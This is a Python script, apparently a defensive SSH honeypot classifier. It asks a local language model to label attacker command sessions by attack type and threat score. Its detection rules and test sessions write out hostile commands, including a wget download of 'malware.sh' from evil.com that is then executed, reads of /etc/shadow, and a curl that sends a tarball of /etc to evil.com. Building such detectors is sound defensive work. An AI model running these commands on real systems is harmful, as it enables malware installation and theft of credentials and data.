import ollama
import json
import re

SYSTEM_PROMPT = """You are a cybersecurity AI that classifies SSH honeypot attacks.

You ALWAYS respond with ONLY a valid JSON object using EXACTLY these field names:
- attack_type: one of "Reconnaissance", "Brute Force", "Data Exfiltration", "Ransomware Deployment"
- threat_score: a float between 0.0 and 1.0
- confidence: one of "low", "medium", "high"
- reasoning: a single sentence explaining your classification
- predicted_next: the most likely next command the attacker will type

Classification rules:
- wget/curl + chmod + execute = Ransomware Deployment (0.85-1.0)
- cat /etc/shadow + tar/curl/scp sending data = Data Exfiltration (0.6-0.9)
- repeated failed passwords / many login failures / credential stuffing = Brute Force (0.3-0.9)
- file uploads or downloads (URLs, hashes) toward malware or exfil = raise severity accordingly
- HASSH / client version alone are weak signals; combine with behavior
- only whoami/uname/ls/hostname/id = Reconnaissance (0.1-0.4)

NEVER use any field names other than the five listed above.
NEVER add any text outside the JSON object.
ALWAYS classify based on the most dangerous command present."""

def classify_with_llm(commands_list, session_intel=None):
    commands_str = "\n".join([f"{i+1}. {cmd}"
                              for i, cmd in enumerate(commands_list)])

    user_prompt = f"""Classify this SSH attack session:

{commands_str}
"""
    if session_intel:
        user_prompt += "\n" + session_intel.strip() + "\n"

    user_prompt += "\nRespond with JSON only."

    try:
        response = ollama.chat(
            model='llama3.2',
            messages=[
                {'role': 'system', 'content': SYSTEM_PROMPT},
                {'role': 'user', 'content': user_prompt}
            ]
        )

        text = response['message']['content'].strip()
        print(f"Raw LLM response:\n{text}\n")

        # Clean markdown if present
        text = re.sub(r'```json\s*', '', text)
        text = re.sub(r'```\s*', '', text)
        text = text.strip()

        # Find JSON object
        start = text.find('{')
        end = text.rfind('}')
        if start != -1 and end != -1:
            json_str = text[start:end+1]
            print(f"Attempting to parse: {json_str}")
            try:
                result = json.loads(json_str)
                print(f"Parsed successfully: {result}")
                return validate_result(result)
            except Exception as e:
                print(f"JSON parse error: {e}")

        return extract_from_text(text)

    except Exception as e:
        print(f"LLM error: {e}")
        return fallback_result()

def extract_from_text(text):
    result = {}

    attack_types = [
        "Ransomware Deployment",
        "Data Exfiltration",
        "Brute Force",
        "Reconnaissance"
    ]
    for at in attack_types:
        if at.lower() in text.lower():
            result["attack_type"] = at
            break

    score_match = re.search(r'"threat_score":\s*(\d+\.?\d*)', text)
    if score_match:
        score = float(score_match.group(1))
        if score > 1:
            score = score / 100
        result["threat_score"] = max(0.0, min(1.0, score))

    reasoning_match = re.search(r'"reasoning":\s*"([^"]+)"', text)
    if reasoning_match:
        result["reasoning"] = reasoning_match.group(1)

    predicted_match = re.search(r'"predicted_next":\s*"([^"]+)"', text)
    if predicted_match:
        result["predicted_next"] = predicted_match.group(1)

    confidence_match = re.search(r'"confidence":\s*"([^"]+)"', text)
    if confidence_match:
        result["confidence"] = confidence_match.group(1)

    if result.get("attack_type"):
        result.setdefault("threat_score", 0.5)
        result.setdefault("confidence", "medium")
        result.setdefault("reasoning", "Extracted from response")
        result.setdefault("predicted_next", "unknown")
        return result

    return fallback_result()

def validate_result(result):
    valid_types = [
        "Reconnaissance",
        "Brute Force",
        "Data Exfiltration",
        "Ransomware Deployment"
    ]

    if result.get("attack_type") not in valid_types:
        for key, value in result.items():
            if isinstance(value, str) and value in valid_types:
                result["attack_type"] = value
                break
        else:
            result["attack_type"] = "Reconnaissance"

    score = float(result.get("threat_score", 0.1))
    result["threat_score"] = max(0.0, min(1.0, score))

    result.setdefault("confidence", "medium")
    result.setdefault("reasoning", "No reasoning provided")
    result.setdefault("predicted_next", "unknown")

    return result

def fallback_result():
    return {
        "attack_type": "Reconnaissance",
        "threat_score": 0.1,
        "confidence": "low",
        "reasoning": "Classification failed",
        "predicted_next": "unknown"
    }

_score_cache = {}

def rule_based_score(command):
    """Use LLM to dynamically score a single command's threat level (0.0-1.0).
    Results are cached per unique command so the LLM is only called once."""
    cmd_key = command.strip().lower()
    if cmd_key in _score_cache:
        return _score_cache[cmd_key]

    prompt = (
        f'Rate the threat level of this SSH honeypot command as a float 0.0 to 1.0.\n'
        f'0.0=harmless, 0.2=basic recon, 0.4=suspicious, 0.7=dangerous, 1.0=critical malware/ransomware.\n'
        f'Command: {command}\n'
        f'Respond with ONLY a JSON object: {{"score": 0.XX, "reason": "short reason"}}'
    )

    try:
        response = ollama.generate(
            model='llama3.2',
            prompt=prompt,
            options={'num_predict': 50, 'temperature': 0.1}
        )

        text = response['response'].strip()
        text = re.sub(r'```json\s*', '', text)
        text = re.sub(r'```\s*', '', text)
        text = text.strip()

        start = text.find('{')
        end = text.rfind('}')
        if start != -1 and end != -1:
            result = json.loads(text[start:end+1])
            score = float(result.get('score', 0.15))
            score = max(0.0, min(1.0, score))
            _score_cache[cmd_key] = score
            return score

        match = re.search(r'(\d+\.?\d*)', text)
        if match:
            score = float(match.group(1))
            if score > 1:
                score = score / 100
            score = max(0.0, min(1.0, score))
            _score_cache[cmd_key] = score
            return score

    except Exception as e:
        print(f"LLM score error: {e}")

    _score_cache[cmd_key] = 0.15
    return 0.15

if __name__ == "__main__":
    print("TEST 1 - Ransomware Session:")
    print("="*50)
    result1 = classify_with_llm([
        "whoami",
        "uname -a",
        "wget http://evil.com/malware.sh",
        "chmod +x malware.sh",
        "./malware.sh"
    ])
    print(f"Attack Type: {result1['attack_type']}")
    print(f"Threat Score: {result1['threat_score']:.0%}")
    print(f"Confidence: {result1['confidence']}")
    print(f"Reasoning: {result1['reasoning']}")
    print(f"Predicted Next: {result1['predicted_next']}")

    print("\nTEST 2 - Reconnaissance Session:")
    print("="*50)
    result2 = classify_with_llm([
        "whoami",
        "uname -a",
        "hostname",
        "ifconfig",
        "ps aux"
    ])
    print(f"Attack Type: {result2['attack_type']}")
    print(f"Threat Score: {result2['threat_score']:.0%}")
    print(f"Confidence: {result2['confidence']}")
    print(f"Reasoning: {result2['reasoning']}")
    print(f"Predicted Next: {result2['predicted_next']}")

    print("\nTEST 3 - Data Exfiltration Session:")
    print("="*50)
    result3 = classify_with_llm([
        "whoami",
        "cat /etc/passwd",
        "cat /etc/shadow",
        "tar -czf /tmp/data.tar.gz /etc",
        "curl http://evil.com --data @/tmp/data.tar.gz"
    ])
    print(f"Attack Type: {result3['attack_type']}")
    print(f"Threat Score: {result3['threat_score']:.0%}")
    print(f"Confidence: {result3['confidence']}")
    print(f"Reasoning: {result3['reasoning']}")
    print(f"Predicted Next: {result3['predicted_next']}")

    print("\nTEST 4 - Brute Force Session:")
    print("="*50)
    result4 = classify_with_llm([
        "failed password for root",
        "failed password for admin",
        "invalid user test",
        "failed password for root",
        "authentication failure"
    ])
    print(f"Attack Type: {result4['attack_type']}")
    print(f"Threat Score: {result4['threat_score']:.0%}")
    print(f"Confidence: {result4['confidence']}")
    print(f"Reasoning: {result4['reasoning']}")
    print(f"Predicted Next: {result4['predicted_next']}")
